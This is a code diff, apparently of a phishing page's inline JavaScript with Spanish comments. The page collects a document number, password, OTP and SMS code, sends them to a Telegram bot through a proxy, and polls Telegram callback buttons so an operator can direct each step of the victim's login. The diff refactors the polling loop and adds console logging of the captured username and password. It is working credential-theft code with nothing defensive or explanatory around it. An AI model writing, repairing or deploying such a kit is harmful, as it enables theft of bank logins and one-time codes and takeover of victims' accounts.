-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
-        }).then(r => r.json()).then(data => {
+        try {
+            const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`;
+            const res = await fetch(TG_PROXY + encodeURIComponent(url), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    offset: ultimoUpdateId + 1,
+                    allowed_updates: ['callback_query'],
+                    timeout: 10
+                })
+            });
+            const data = await res.json();
+
             if (!data.ok || !data.result || data.result.length === 0) {
-                pollingTimeout = setTimeout(check, 2000); return;
+                pollingTimeout = setTimeout(check, 2000);
+                return;
             }
+
             for (const u of data.result) {
                 ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
                 if (u.callback_query) {
@@ -775,13 +759,15 @@ function escucharBotones(callbackAction) {
                 }
             }
             pollingTimeout = setTimeout(check, 2000);
-        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+        } catch (err) {
+            pollingTimeout = setTimeout(check, 3000);
+        }
     }
     check();
 }
 
 // ==========================================
-// ACCIONES DE TELEGRAM
+// ACCIONES DE BOTONES
 // ==========================================
 function handleTelegramActionLogin(action) {
     if (actionProcessed) return;
@@ -866,10 +852,12 @@ function handleTelegramActionSms(action) {
 }
 
 // ==========================================
-// SUBMIT DEL FORMULARIO PRINCIPAL
+// SUBMIT
 // ==========================================
-demoForm.addEventListener("submit", function(event) {
-    event.preventDefault();
+demoForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+    console.log('✅ Submit disparado. Botón disabled?', submitBtn.disabled);
+
     if (submitBtn.disabled) return;
 
     mostrarOverlay();
@@ -877,15 +865,15 @@ demoForm.addEventListener("submit", function(event) {
     const user = documentNumber.value.trim();
     const pass = claveInput.value.trim();
 
+    console.log('📤 Enviando:', { tipoDoc, user, pass });
     enviarIdentificacionTelegram(tipoDoc, user, pass);
 });
 
 // ==========================================
-// LÓGICA OTP
+// OTP
 // ==========================================
 function actualizarOTP() {
     const valor = otpInput.value;
-
     otpSlots.forEach((slot, index) => {
         if (index < valor.length) {
             slot.textContent = valor[index];
@@ -951,8 +939,9 @@ btnSmsFinal.addEventListener("click", () => {
     enviarSmsTelegram(smsCodeInput.value);
 });
 
-// Inicializar
+// Init
 actualizarBoton();
+console.log('✅ Portal cargado. Listo para enviar.');
 </script>
 
 </body>
